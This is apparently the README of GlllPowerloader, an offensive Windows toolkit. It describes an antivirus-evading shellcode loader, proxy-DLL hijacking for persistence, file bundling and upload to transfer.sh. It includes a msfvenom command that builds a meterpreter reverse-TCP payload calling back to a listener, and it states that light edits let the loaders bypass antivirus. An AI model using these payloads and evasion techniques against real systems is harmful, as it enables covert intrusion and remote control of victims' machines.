# GlllPowerloader


- [1.前言](#1前言)

- [2.功能](#2功能)

- [3.使用](#3使用)
  - [0x01.环境安装](#0x01环境安装)
  
  - [0x02.shellcode loader的使用](#0x02shellcode-loader的使用)
  
  - [0x03.Automation\_loader](#0x03automation_loader)
  
  - [0x04.文件格式转换](#0x04文件格式转换)
  
  - [0x05.自动化生成代理DLL](#0x05自动化生成代理dll)
  
  - [0x06.文件捆绑和上传](#0x06文件捆绑和上传)
  
    
  
- [4.更新](#4更新)

- [5.免责声明](#5免责声明)

- [6.结语](#6结语)

# 1.前言

* 视频讲解：https://www.bilibili.com/video/BV1RK411z7XA/  欢迎点赞关注

- 刚开始可以免杀主流杀软的，不过后面肯定会被乱杀，主要目的是学习恶意代码和自动化


# 2.功能



|      功能      |                 描述                  |
| :------------: | :-----------------------------------: |
|  1.免杀加载器  |    拥有十种以上的shellcode加载方式    |
| 2.文件格式转换 |      Windows中文件格式之间的转换      |
|   3.权限维持   | 生成代理劫持的Dll，用于持久化渗透测试 |
|   4.文件捆绑   |     1.捆绑文件异步执行2.上传文件      |



# 3.使用

## 0x01.环境安装

您必须下载并安装以下环境：

1.Mingw64(C/C++)的编程环境：https://github.com/niXman/mingw-builds-binaries/releases/download/12.2.0-rt_v10-rev2/x86_64-12.2.0-release-posix-seh-msvcrt-rt_v10-rev2.7z

将bin目录添加至环境变 量即可

2.Golang编程环境：https://go.dev/dl/go1.19.4.windows-amd64.msi

3.Nim编程环境：

Nim下载：https://nim-lang.org/install.html

将bin目录添加至环境变量

您还需要下载Winim：https://github.com/khchen/winim

```
cd winim-master
nimble install
```

如果您在windows中安装了Git，就可以这样使用：

```
git clone https://github.com/INotGreen/GlllPowerloader.git
cd GlllPowerLoader-master
pip install -r requirements.txt
start.bat
```



## 0x02.shellcode loader的使用

大部分已经不能免杀了，不过稍微改一下基本上都能过，建议使用无阶段的shellcode（Stageless）

Metasploit:

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.0 LPORT=4488 -f raw -o payload.bin
```



## 0x03.Automation_loader



## 0x04.文件格式转换



## 0x06.文件托管

将文件上传到https://transfer.sh/



# 4.更新

[+] 2022年12.21，Powerloader发布

[+]2023 年11.15-19，删除冗余的功能，优化代码


# 5.免责声明

该工具仅用于网络安全教育和研究，禁止用于非法途径，我对您由使用或传播等由此软件引起的任何行为和/或损害不承担任何责任。您对使用此软件的任何行为承担全部责任，并承认此软件仅用于教育和研究目的。下载本软件或软件的源代码，您自动同意上述内容。

# 6.致谢

在编写Powerloader时学习了很多前辈的项目，在此我非常感谢他们

关于C/C++的加载器 ，我参考了它的部分代码和框架格式，这非常有意义：https://github.com/icyguider/Shhhloader

还有Nim惊人的项目：https://github.com/byt3bl33d3r/OffensiveNim

感谢：https://github.com/danielbohannon/Invoke-DOSfuscation

https://github.com/peewpw/Invoke-PSImage
